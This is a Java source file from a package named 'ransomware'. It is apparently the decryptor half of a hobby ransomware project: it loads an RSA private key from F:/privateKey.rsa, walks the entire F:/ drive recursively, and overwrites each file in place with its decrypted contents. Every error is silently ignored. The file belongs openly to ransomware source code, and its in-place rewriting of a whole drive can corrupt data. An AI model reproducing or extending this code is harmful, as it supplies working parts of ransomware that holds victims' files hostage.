/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package ransomware;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.KeyFactory;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.PKCS8EncodedKeySpec;
import java.util.Base64;
import javax.crypto.BadPaddingException;

import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

public class Decryption {

    public static void main(String[] args) {
        try {
            decryption(new File("F:/"));
        } catch (Exception e) {

        }
    }
    static int spc_count = -1;

    private static void decryption(File aFile) {
        try {
            // Read file contain private key
            FileInputStream fis = new FileInputStream("F:/privateKey.rsa");
            byte[] b = new byte[fis.available()];
            fis.read(b);
            fis.close();

            // Create private key
            PKCS8EncodedKeySpec spec = new PKCS8EncodedKeySpec(b);
            KeyFactory factory = KeyFactory.getInstance("RSA");
            PrivateKey priKey = factory.generatePrivate(spec);

            // Decrypt data
            Cipher c = Cipher.getInstance("RSA");
            c.init(Cipher.DECRYPT_MODE, priKey);

            spc_count++;
            String spcs = "";
            for (int i = 0; i < spc_count; i++) {
                spcs += " ";
            }
            if (aFile.isFile()) {
                if (!"publicKey.rsa".equals(aFile.getName())) {
                    byte[] DataMaHoa;
                    try (FileInputStream FileMaHoa = new FileInputStream(aFile.getPath())) {
                        DataMaHoa = new byte[FileMaHoa.available()];
                        FileMaHoa.read(DataMaHoa);
                    }
                    byte[] DataGiaiMa = c.doFinal(Base64.getDecoder().decode(DataMaHoa));
                    try (FileOutputStream fos = new FileOutputStream(aFile.getPath())) {
                        fos.write(DataGiaiMa);
                    }
                }
            } else if (aFile.isDirectory()) {
                File[] listOfFiles = aFile.listFiles();
                if (listOfFiles != null) {
                    for (int i = 0; i < listOfFiles.length; i++) {
                        decryption(listOfFiles[i]);
                    }
                }
            }
            spc_count--;

        } catch (IOException | InvalidKeyException | NoSuchAlgorithmException | InvalidKeySpecException | BadPaddingException | IllegalBlockSizeException | NoSuchPaddingException ex) {
        }
    }
}
